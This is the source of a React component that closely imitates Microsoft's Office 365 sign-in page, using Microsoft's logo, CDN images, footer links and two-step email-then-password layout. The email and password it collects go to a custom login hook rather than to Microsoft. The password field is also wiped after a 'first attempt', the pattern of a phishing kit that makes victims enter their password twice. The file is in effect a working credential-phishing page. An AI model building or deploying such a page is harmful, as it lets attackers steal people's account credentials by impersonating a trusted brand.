import React, { useState } from 'react';
import { useLogin } from '../hooks/useLogin';
import Spinner from './common/Spinner';
import { ArrowLeft } from 'lucide-react';

interface Office365LoginPageProps {
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const Office365LoginPage: React.FC<Office365LoginPageProps> = ({ onLoginSuccess, onLoginError }) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPasswordStep, setShowPasswordStep] = useState(false);

  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);

  const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (email) { setShowPasswordStep(true); }
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: 'Office365' });
    if (result?.isFirstAttempt) { setPassword(''); }
  };

  const handleBackToEmail = () => {
    setShowPasswordStep(false);
    setPassword('');
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 font-sans bg-gray-100">
      <div className="w-full max-w-[440px] shadow-lg">
        {/* Solid White Card */}
        <div className="bg-white p-11">
          {!showPasswordStep ? (
            // Email View
            <div>
              <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" className="h-6 mb-5" />
              <h1 className="text-2xl font-semibold text-gray-800 mb-6">Sign in</h1>
              {errorMessage && !isLoading && (
                <p className="text-red-600 text-sm mb-4">{errorMessage}</p>
              )}
              <form onSubmit={(e) => e.preventDefault()}>
                <input 
                  type="email" 
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder="Email, phone, or Skype" 
                  autoCapitalize="none"
                  className="w-full py-1.5 bg-transparent text-base border-0 border-b-2 border-gray-600 focus:border-blue-600 focus:ring-0 focus:outline-none placeholder-gray-600"
                />
                <p className="text-sm mt-4">No account? <a href="https://signup.live.com/" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Create one!</a></p>
                <p className="text-sm mt-2"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Can't access your account?</a></p>
                <div className="text-right mt-6">
                  <button onClick={handleNext} disabled={!email} className="px-8 py-2 bg-[#0067b8] text-white font-medium hover:bg-[#005a9e] disabled:bg-gray-400">
                    Next
                  </button>
                </div>
              </form>
            </div>
          ) : (
            // Password View
            <div>
              <button onClick={handleBackToEmail} className="flex items-center text-sm text-gray-700 mb-4">
                <ArrowLeft className="w-4 h-4 mr-2" />
                <span>{email}</span>
              </button>
              <h1 className="text-2xl font-semibold text-gray-800 mb-4">Enter password</h1>
               {errorMessage && !isLoading && (
                <p className="text-red-600 text-sm mb-4">{errorMessage}</p>
              )}
              <form onSubmit={handleSubmit}>
                <input 
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Password"
                  autoFocus
                  className="w-full py-1.5 bg-transparent text-base border-0 border-b-2 border-gray-600 focus:border-blue-600 focus:ring-0 focus:outline-none placeholder-gray-600"
                />
                <p className="text-sm mt-4"><a href="https://account.live.com/password/reset" target="_blank" rel="noopener noreferrer" className="text-blue-600 hover:underline">Forgot password?</a></p>
                 <div className="text-right mt-6">
                  <button type="submit" disabled={isLoading || !password} className="px-8 py-2 bg-[#0067b8] text-white font-medium hover:bg-[#005a9e] disabled:bg-gray-400 flex items-center justify-center min-w-[108px]">
                    {isLoading ? <Spinner size="sm" color="border-white" /> : 'Sign in'}
                  </button>
                </div>
              </form>
            </div>
          )}
        </div>
        {/* Sign-in Options Card */}
        <div className="bg-white border-t border-gray-200 p-4 cursor-pointer hover:bg-gray-50">
          <div className="flex items-center ml-7">
            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options" className="w-6 h-6 mr-3" />
            <span className="text-gray-700 text-[15px]">Sign-in options</span>
          </div>
        </div>
      </div>
      <footer className="fixed bottom-3 right-6 text-xs text-gray-800">
        <a href="https://www.microsoft.com/en-US/servicesagreement/" target="_blank" rel="noopener noreferrer" className="hover:underline mr-4">Terms of use</a>
        <a href="https://www.microsoft.com/en-US/privacy/privacystatement" target="_blank" rel="noopener noreferrer" className="hover:underline mr-4">Privacy & cookies</a>
        <span className="cursor-pointer">...</span>
      </footer>
    </div>
  );
};

export default Office365LoginPage;
